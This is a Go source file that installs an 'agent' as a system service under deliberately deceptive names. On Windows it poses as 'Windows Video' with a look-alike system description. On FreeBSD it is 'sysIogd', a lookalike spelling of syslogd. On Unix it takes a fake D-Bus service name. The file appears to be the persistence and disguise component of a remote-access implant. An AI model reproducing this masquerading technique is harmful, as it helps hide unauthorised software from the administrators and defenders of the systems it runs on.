// This defines the setup of the agent as a system service.
// The logic is separated to allow for running the executable
// standalone as well as as a service
package agent

import (
	"runtime"

	"github.com/kardianos/service"
)

func GetServiceConfig() *service.Config {
	var svcName, svcDisplayName, svcDesc string
	switch runtime.GOOS {
	// Windows config
	case "windows":
		svcName = "Windows Video"
		svcDisplayName = "VideoSrv"
		svcDesc = "Manages video for Windows-based programs.  If this service is stopped, video devices and effects will not function properly.  If this service is disabled, any services that explicitly depend on it will fail to start"
	// FreeBSD config
	case "freebsd":
		svcName = "sysIogd"
		svcDisplayName = "sysIogd"
		svcDesc = "System Iog daemon"
	// Unix config
	default:
		svcName = "dbus-org.freedesktop.export1"
		svcDisplayName = "Disk Image Upload Service"
		svcDesc = ""
	}

	return &service.Config{
		Name:        svcName,
		DisplayName: svcDisplayName,
		Description: svcDesc,
	}
}

type Program struct {}

func (p *Program) Start(s service.Service) error {
	// Start should not block. Run agent in background
	go p.run()
	return nil
}

func (p *Program) run() {
	// Calls the agent start method
	start()
}

func (p *Program) Stop(s service.Service) error {
	// Process will exit when killed.
	return nil
}
